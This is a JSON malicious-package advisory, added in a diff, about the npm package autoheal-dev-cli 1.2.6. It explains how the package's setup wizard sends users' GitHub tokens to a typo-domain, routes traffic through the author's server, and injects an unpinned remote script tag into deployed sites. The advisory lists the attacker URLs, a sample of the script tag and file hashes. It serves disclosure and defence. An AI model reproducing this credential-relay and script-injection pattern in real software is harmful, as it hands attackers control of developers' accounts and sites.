@@ -1,0 +1,75 @@
+{
+  "modified": "2026-05-23T13:36:24Z",
+  "published": "2026-05-23T13:36:24Z",
+  "schema_version": "1.7.4",
+  "id": "",
+  "summary": "CLI wizard exfiltrates user GitHub PAT and forces traffic through author-controlled infrastructure",
+  "details": "autoheal-dev-cli is a setup wizard (`bin/setup.js`) that, when run, performs three installer-harm actions against the developer running it: (1) `syncConfigToServer()` POSTs the user's GitHub Personal Access Token (with repo + user:email scopes), Vercel deploy hook URL, GitHub repo/branch, and n8n webhook to the hardcoded URL `https://auomation.vercel.app/api/settings` (note the misspelled `auomation` vs `automation`); the destination is not user-configurable. A holder of that endpoint can push code to every user's GitHub repos. (2) Despite the README presenting a choice to use the user's own n8n instance, the code unconditionally sets `useSharedBridge = true` and overwrites `n8nWebhook` to `https://creativekulhad.onrender.com/webhook/autoheal-patch-handler`, routing every patch dispatch from every user through the author's Render server. (3) The wizard rewrites the user's `index.html` to add `\u003cscript src=\"https://auomation.vercel.app/autoheal.js\"\u003e\u003c/script\u003e` with no SRI or version pinning, then `git push --force`s and triggers a Vercel deploy — so every visitor to the user's production site fetches and executes mutable JavaScript served from the author's domain in the user's origin. Additionally, the user's GitHub PAT is embedded directly into the git remote URL (`https://\u003ctoken\u003e@github.com/...`) and persisted in the local `.git/config`, and the wizard force-pushes without confirmation. The combination of silent relay of credentials to a typo-domain, forced routing of all generated patches through author infrastructure, and unpinned remote-script injection into the user's deployed site is a multi-channel installer-harm pattern that gives the publisher persistent control over both the developer's GitHub account and any site deployed through this wizard.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "autoheal-dev-cli"
+      },
+      "versions": [
+        "1.2.6"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "bin/setup.js",
+              "sha256": "af33d2266fddeaebee6dfd2f8df5f272b9b5cf4add5eb0f1259118bd6e1e26f9",
+              "tlsh": "d24351b2592511207eb4ca6d9f230812f61a7617f104a624b9fcf19a5ffe441c927efc"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "autoheal-dev-cli-1.2.6.tgz",
+              "hashes": {
+                "sha1": "7aea1c89fbb036941e36c5fee5a19140196279b4",
+                "sha512_sri": "sha512-79LUh1aIhEhnxwBhvVGaBxUBKmImsynYKupKFWnCEi30e+yYm+vmqH57SlZyBM3tj/vlEy0XXtbdi/GPqyIfmw=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/autoheal-dev-cli/v/1.2.6"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "actran@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "6e0f114cd638df1be1f2262e1b05dbe726cee5600a10be6d67be8ac8e1089f3d",
+        "import_time": "2026-05-26T05:52:23.608551164Z",
+        "id": "IN-MAL-2026-004331",
+        "modified_time": "2026-05-23T13:36:24Z",
+        "versions": [
+          "1.2.6"
+        ]
+      }
+    ]
+  }
+}
